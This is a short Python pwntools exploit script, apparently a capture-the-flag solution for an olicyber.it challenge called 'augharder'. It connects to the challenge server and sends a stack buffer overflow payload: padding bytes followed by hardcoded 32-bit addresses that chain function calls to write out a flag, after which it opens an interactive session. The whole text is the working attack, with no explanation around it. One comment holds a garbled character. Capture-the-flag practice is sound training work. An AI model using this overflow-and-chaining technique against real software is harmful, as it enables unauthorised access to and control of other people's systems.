from pwn import *
r = remote("augharder.challs.olicyber.it", 10607)
payload = b"A"*0x2A
payload+= p32(0)*3
payload+= p32(0x804866D) #¶et
payload += p32(0x8048717) #betawrite
payload += p32(0)
payload += p32(0x8048cf0) #flag address
payload += p32(0x95)
r.sendline(b"5")
r.sendline(payload)
r.interactive()